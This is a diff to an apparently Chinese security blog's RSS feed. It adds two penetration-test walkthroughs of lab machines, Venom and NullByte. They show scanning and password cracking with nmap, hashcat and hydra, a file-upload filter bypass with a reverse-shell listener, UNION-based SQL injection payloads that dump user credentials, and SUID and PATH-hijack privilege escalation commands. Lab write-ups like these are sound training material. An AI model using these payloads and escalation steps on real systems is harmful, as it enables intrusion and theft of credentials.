@@ -1071,7 +1071,7 @@ open x.jpg
 <h1 id="linux-提权">Linux 提权</h1>
 <p>查看 suid 位可执行文件</p>
 <pre tabindex="0"><code>find / -perm /u=s,g=s -type f 2&gt;/dev/null
-</code></pre><p>![[P24.png]]</p>
+</code></pre><p>![[content/posts/DeathStart Writeup/P24.png]]</p>
 <p>发现可疑文件 /bin/dartVader</p>
 <h1 id="主函数与反汇编">主函数与反汇编</h1>
 <p>将文件拿到 kali 当中</p>
@@ -1119,6 +1119,100 @@ open x.jpg
 </code></pre><p><img src="%E8%8E%B7%E5%BE%97.png" alt="获得"></p>
 <p>回到 kali 中，重新获得 ip</p>
 <p><img src="%E8%8E%B7%E5%BE%97ip.png" alt="获得ip.png"></p>
+]]></content></item><item><title>Venom Writeup</title><link>https://enilmalus.github.io/posts/venom-writeup/</link><pubDate>Sat, 24 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/venom-writeup/</guid><description>&lt;h1 id="服务扫描"&gt;服务扫描&lt;/h1&gt;
+&lt;h2 id="使用-nmap-进行基础扫描"&gt;使用 nmap 进行基础扫描&lt;/h2&gt;
+&lt;p&gt;扫描所执行的命令，执行结果如下&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sn 10.10.10.0/24
+sudo nmap --min-rate 10000 -p- 10.10.10.31
+sudo nmap -sC -sT -sV -p22,80 10.10.10.31
+sudo nmap --script=vuln -p22,80 10.10.10.31
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P1.png" alt="P1"&gt;&lt;/p&gt;
+&lt;p&gt;21 端口开放了 ftp 服务，在找到账号密码后可进行 登入 ，
+靶机还开放了 smb 服务，可进行更详细的 smb 扫描，&lt;/p&gt;
+&lt;p&gt;查看 80 端口，是 Ubuntu 的默认界面&lt;/p&gt;
+&lt;p&gt;&lt;img src="P2.png" alt="P2"&gt;&lt;/p&gt;
+&lt;p&gt;查看源代码发现串 md5&lt;/p&gt;
+&lt;p&gt;&lt;img src="P3.png" alt="P3"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="P4.png" alt="P4"&gt;&lt;/p&gt;
+&lt;p&gt;使用 hashcat 破解&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo hashcat -m 0 -a 0 Hash/md5.txt /usr/share/wordlists/rockyou.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P9.png" alt="P9"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="P10.png" alt="P10"&gt;&lt;/p&gt;
+&lt;p&gt;使用该字符串尝试进行 ftp 登入，因为没有密码，使用账号密码都使用 hostinger&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;ftp 10.10.10.6
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P11.png" alt="P11"&gt;&lt;/p&gt;
+&lt;p&gt;binary 进入 二进制 模式&lt;/p&gt;</description><content type="html"><![CDATA[<h1 id="服务扫描">服务扫描</h1>
+<h2 id="使用-nmap-进行基础扫描">使用 nmap 进行基础扫描</h2>
+<p>扫描所执行的命令，执行结果如下</p>
+<pre tabindex="0"><code>sudo nmap -sn 10.10.10.0/24
+
+sudo nmap --min-rate 10000 -p- 10.10.10.31   
+
+sudo nmap -sC -sT -sV -p22,80 10.10.10.31 
+
+sudo nmap --script=vuln -p22,80 10.10.10.31 
+</code></pre><p><img src="P1.png" alt="P1"></p>
+<p>21 端口开放了 ftp 服务，在找到账号密码后可进行 登入 ，
+靶机还开放了 smb 服务，可进行更详细的 smb 扫描，</p>
+<p>查看 80 端口，是 Ubuntu 的默认界面</p>
+<p><img src="P2.png" alt="P2"></p>
+<p>查看源代码发现串 md5</p>
+<p><img src="P3.png" alt="P3"></p>
+<p><img src="P4.png" alt="P4"></p>
+<p>使用 hashcat 破解</p>
+<pre tabindex="0"><code>sudo hashcat -m 0 -a 0 Hash/md5.txt /usr/share/wordlists/rockyou.txt
+</code></pre><p><img src="P9.png" alt="P9"></p>
+<p><img src="P10.png" alt="P10"></p>
+<p>使用该字符串尝试进行 ftp 登入，因为没有密码，使用账号密码都使用 hostinger</p>
+<pre tabindex="0"><code>ftp 10.10.10.6
+</code></pre><p><img src="P11.png" alt="P11"></p>
+<p>binary 进入 二进制 模式</p>
+<pre tabindex="0"><code>binary
+</code></pre><p>获取文件</p>
+<pre tabindex="0"><code>ls -liah
+
+cd files
+
+get hint.txt
+
+exit
+</code></pre><p><img src="P12.png" alt="P12"></p>
+<p>查看下载下来的 txt 文件</p>
+<p><img src="P14.png" alt="P14"></p>
+<p>你需要跟随 &lsquo;hostinger&rsquo; 两个 base64 编码解密如下</p>
+<p><img src="P15.png" alt="P15"></p>
+<p><img src="P16.png" alt="P16"></p>
+<p>进入给定的链接，将参数给上</p>
+<p><img src="P19.png" alt="P19"></p>
+<p>根据提示访问 venom.box</p>
+<p><img src="P18.png" alt="P18"></p>
+<p>登入 dora</p>
+<p><img src="P20.png" alt="P20"></p>
+<p>点击齿轮，进入后台</p>
+<p><img src="P21.png" alt="P21"></p>
+<p>找到文件上传页面，上传一个 php 漏洞</p>
+<p><img src="P22.png" alt="P22"></p>
+<p>php 被过滤了，尝试不常见的 php 后缀，发现 phar 没被过滤</p>
+<h1 id="linux-提权">Linux 提权</h1>
+<p>kali 建立 监听</p>
+<pre tabindex="0"><code>sudo nc -lvnp 4444
+</code></pre><p><img src="P23.png" alt="P23">
+![content/posts/Venom Writeup/P24](content/posts/Venom Writeup/P24.png)</p>
+<p>查看 passwd ，寻找 拥有 bash 环境 的用户</p>
+<p><img src="P25.png" alt="P25"></p>
+<p>切换成 hostinger 用户</p>
+<pre tabindex="0"><code>su hostinger
+</code></pre><p>在 /var/www/html/subrion/backup 下发现了一个密码</p>
+<p><img src="P26.png" alt="P26"></p>
+<p>尝试切换为 nathan 用户</p>
+<p>查看具有 s 位 的可执行文件</p>
+<pre tabindex="0"><code>find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre><p><img src="P27.png" alt="P27"></p>
+<p>使用 find 提权</p>
+<pre tabindex="0"><code>sudo install -m =xs $(which find) .
+
+./find . -exec /bin/bash -p \; -quit
+</code></pre><p><img src="P28.png" alt="P28"></p>
 ]]></content></item><item><title>Credit Card Scammers Writeup</title><link>https://enilmalus.github.io/posts/credit-card-scammers-writeup/</link><pubDate>Sun, 18 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/credit-card-scammers-writeup/</guid><description>&lt;blockquote&gt;
 &lt;p&gt;此文章以 kali 地址为 10.10.10.5 为示例&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -1610,4 +1704,171 @@ sudo python3 /home/john/file.py
 <p>这台靶机的难度中等偏下，
 文件上传的时候需要一些经验和尝试，
 linux 提权的时候要了解 suid 环境变量提权</p>
+]]></content></item><item><title>NullByte Writeup</title><link>https://enilmalus.github.io/posts/nullbyte-writeup/</link><pubDate>Thu, 08 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/nullbyte-writeup/</guid><description>&lt;h1 id="nullbyte-靶场"&gt;NullByte 靶场&lt;/h1&gt;
+&lt;h2 id="主机发现"&gt;主机发现&lt;/h2&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sn 10.10.10.10
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P1.png" alt="P1"&gt;&lt;/p&gt;
+&lt;p&gt;靶机的主机为 10.10.10.7&lt;/p&gt;
+&lt;h2 id="服务识别"&gt;服务识别&lt;/h2&gt;
+&lt;p&gt;使用 nmap 对靶机进行扫描，寻找靶机开放的端口以便于进行更进一步的渗透测试&lt;/p&gt;
+&lt;p&gt;扫描开放的端口&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap --min-rate 10000 -p- 10.10.10.7
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P2.png" alt="P2"&gt;&lt;/p&gt;
+&lt;p&gt;扫描开放端口的基本信息，并将结果保存到本地以便于随时观看&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sT -sC -sV -p80,111,777,48675 10.10.10.7 -oA nmap/Scan
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P4.png" alt="P4"&gt;&lt;/p&gt;
+&lt;p&gt;使用 nmap 进行默认的漏洞脚本扫描，并将结果保存到本地&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap --script=vuln -p80,111,777,48675 10.10.10.7 -oA nmap/Script
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;经过分析发现靶机运行的是 Apache 服务；
+777 端口运行的是 SSH 服务，&lt;/p&gt;
+&lt;p&gt;暂时没有新的发现，先访问 80 端口&lt;/p&gt;
+&lt;h2 id="web渗透"&gt;WEB渗透&lt;/h2&gt;
+&lt;h3 id="80-端口渗透"&gt;80 端口渗透&lt;/h3&gt;
+&lt;p&gt;打开 80 页面发现只有一张图片和一句话&lt;/p&gt;
+&lt;p&gt;&lt;img src="P3.png" alt="P3"&gt;&lt;/p&gt;
+&lt;p&gt;查看源码发现这是一个 gif 文件，把他下载下来&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;wget http://10.10.10.7/main.git
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="目录爆破"&gt;目录爆破&lt;/h3&gt;
+&lt;p&gt;使用 gobuster 执行目录爆破，尝试发现新的目录&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo gobuster dir -u http://10.10.10.7 -w /usr/share/dirb/wordlists/common.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P5.png" alt="P5"&gt;&lt;/p&gt;</description><content type="html"><![CDATA[<h1 id="nullbyte-靶场">NullByte 靶场</h1>
+<h2 id="主机发现">主机发现</h2>
+<pre tabindex="0"><code>sudo nmap -sn 10.10.10.10
+</code></pre><p><img src="P1.png" alt="P1"></p>
+<p>靶机的主机为 10.10.10.7</p>
+<h2 id="服务识别">服务识别</h2>
+<p>使用 nmap 对靶机进行扫描，寻找靶机开放的端口以便于进行更进一步的渗透测试</p>
+<p>扫描开放的端口</p>
+<pre tabindex="0"><code>sudo nmap --min-rate 10000 -p- 10.10.10.7
+</code></pre><p><img src="P2.png" alt="P2"></p>
+<p>扫描开放端口的基本信息，并将结果保存到本地以便于随时观看</p>
+<pre tabindex="0"><code>sudo nmap -sT -sC -sV -p80,111,777,48675 10.10.10.7 -oA nmap/Scan
+</code></pre><p><img src="P4.png" alt="P4"></p>
+<p>使用 nmap 进行默认的漏洞脚本扫描，并将结果保存到本地</p>
+<pre tabindex="0"><code>sudo nmap --script=vuln -p80,111,777,48675 10.10.10.7 -oA nmap/Script
+</code></pre><p>经过分析发现靶机运行的是 Apache 服务；
+777 端口运行的是 SSH 服务，</p>
+<p>暂时没有新的发现，先访问 80 端口</p>
+<h2 id="web渗透">WEB渗透</h2>
+<h3 id="80-端口渗透">80 端口渗透</h3>
+<p>打开 80 页面发现只有一张图片和一句话</p>
+<p><img src="P3.png" alt="P3"></p>
+<p>查看源码发现这是一个 gif 文件，把他下载下来</p>
+<pre tabindex="0"><code>wget http://10.10.10.7/main.git
+</code></pre><h3 id="目录爆破">目录爆破</h3>
+<p>使用 gobuster 执行目录爆破，尝试发现新的目录</p>
+<pre tabindex="0"><code>sudo gobuster dir -u http://10.10.10.7 -w /usr/share/dirb/wordlists/common.txt
+</code></pre><p><img src="P5.png" alt="P5"></p>
+<p>逐个尝试发现只有 /phpmyadmin 是能访问的，并且这是一个 sql 管理后台登入界面。</p>
+<p>尝试弱密码和万能密码登入均无效，暂时放弃。</p>
+<h3 id="gif-寻找信息">gif 寻找信息</h3>
+<p>拿到 gif 图片，先使用 strings 查看有没有有价值的字符串</p>
+<pre tabindex="0"><code>strings main.gif
+</code></pre><p>发现 kzMb5nVYJw 这个字符串很可疑，可能有突破的价值</p>
+<p><img src="P6.png" alt="P6"></p>
+<p>继续使用 Exiftool 发掘 gif 剩余价值</p>
+<pre tabindex="0"><code>exiftool main.gif
+</code></pre><p><img src="P7.png" alt="P7"></p>
+<p>Comment 处写着 kzMb5nVYJw ，说明这串字符串极有可能是突破口，使用 hash-identifier 没有识别出来是什么加密，单串字符串是账号密码的可能性也不大，因此尝试作为地址能不能有新发现</p>
+<p><img src="P8.png" alt="P8"></p>
+<p>查看源码</p>
+<p><img src="P9.png" alt="P9"></p>
+<p>提示这个密码不复杂</p>
+<h3 id="hydra-破解-hash">Hydra 破解 hash</h3>
+<p>输入框尝试弱密码 admin 报错</p>
+<p><img src="P10.png" alt="P10"></p>
+<p>查看网络发现这是一个 post 请求，使用 Hydra 对 hash 进行破解</p>
+<pre tabindex="0"><code>sudo hydra -l &#34;key&#34; -P /usr/share/wordlists/rockyou.txt 10.10.10.7 http-form-post &#34;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&#34;
+</code></pre><ol>
+<li>
+<p><strong>路径</strong>：<code>/kzMb5nVYJw/index.php</code>（表单提交地址）。</p>
+</li>
+<li>
+<p><strong>参数</strong>：<code>key=^PASS^</code>（将 <code>^PASS^</code> 替换为字典中的密码）。</p>
+</li>
+<li>
+<p><strong>失败标记</strong>：<code>invalid key</code>（服务器返回的错误提示文本）。</p>
+</li>
+</ol>
+<p>![Pasted image 20250508214915](Pasted image 20250508214915.png)</p>
+<p>得到密码是 elite ，
+登入后发现是一个 sql 查询</p>
+<h2 id="sql-注入">sql 注入</h2>
+<p>输入 admin 发现提示寻找成功</p>
+<p><img src="P11.png" alt="P11"></p>
+<p>尝试过后发现注入点为 &quot; ，
+进行测试发现字段为 3 ，
+输出点为
+<code>&quot; union select 1,2,3 -- -</code>
+中的 3 ，
+完整的测试代码如下</p>
+<pre tabindex="0"><code>&#34;
+
+&#34; or 1=1 -- -
+
+&#34; order by 3 -- -
+
+&#34; union select 1,2,3 -- -
+
+&#34; union select 1,2,version() -- -
+
+&#34; union select 1,2,database() -- -
+
+&#34; union select 1,2,user() -- -
+
+&#34; union select 1,2,TABLE_SCHEMA from INFORMATION_SCHEMA.tables -- -
+
+&#34; union select 1,2,table_name from INFORMATION_SCHEMA.tables -- -
+
+&#34; union select 1,2,column_name from INFORMATION_SCHEMA.columns where table_name=&#39;users&#39; -- -
+
+&#34; union select 1,2,user from users -- -
+
+&#34; union select 1,2,pass from users -- -
+
+&#34; union select 1,2,position  from users -- -
+</code></pre><p>在完整地测试过后在 users 中的 pass 里发现一串 base64 （base64 更多凭经验判断， hash-identifier 无法识别），</p>
+<p><img src="P12.png" alt="P12"></p>
+<p>解密后得到一串字符串
+<code>c6d6bd7ebf806f43c76acc3681703b81</code></p>
+<p>使用 hash-identifier 发现是 MD5 加密，使用 hashcat 破解它</p>
+<pre tabindex="0"><code>vim hash/hash.lst
+
+sudo hashcat -m 0 -a 0 hash/hash.lst /usr/share/wordlists/rockyou.txt
+</code></pre><p>解密出来
+<code>c6d6bd7ebf806f43c76acc3681703b81:omega</code></p>
+<h2 id="linux-提权">Linux 提权</h2>
+<p>使用 ssh 登入靶机</p>
+<pre tabindex="0"><code>sudo ssh ramses@10.10.10.7 -p777 
+</code></pre><p>查看历史记录</p>
+<pre tabindex="0"><code>history
+</code></pre><p>![Pasted image 20250508230256](Pasted image 20250508230256.png)</p>
+<p>发现 /var/www 目录可能藏着提权的文件，
+根据提示进行操作</p>
+<pre tabindex="0"><code>cd /var/www
+cd backup/
+ls
+cat readme.txt
+</code></pre><p><img src="P13.png" alt="P13"></p>
+<p>没什么价值，查看文件权限</p>
+<pre tabindex="0"><code>ls -liah
+</code></pre><p><img src="P14.png" alt="P14"></p>
+<p>提示文件可能有 s 位执行权限，查看含有 s 位执行权限的文件</p>
+<pre tabindex="0"><code>find / -perm -u=s -type f 2&gt;/dev/null
+./procwatch
+</code></pre><p><img src="P15.png" alt="P15"></p>
+<p>果然有，运行查看结果</p>
+<p><img src="P16.png" alt="P16"></p>
+<p>SUID 环境变量提权</p>
+<pre tabindex="0"><code>ln -s /bin/sh ps
+
+export PATH=.:$PATH
+
+echo $PATH
+
+./procwatch 
+</code></pre><p>拿到 root 权限</p>
+<p><img src="P17.png" alt="P17"></p>
+<h2 id="总结">总结</h2>
+<p>这台靶机不难，新手可以用来梳理思路</p>
 ]]></content></item></channel></rss>
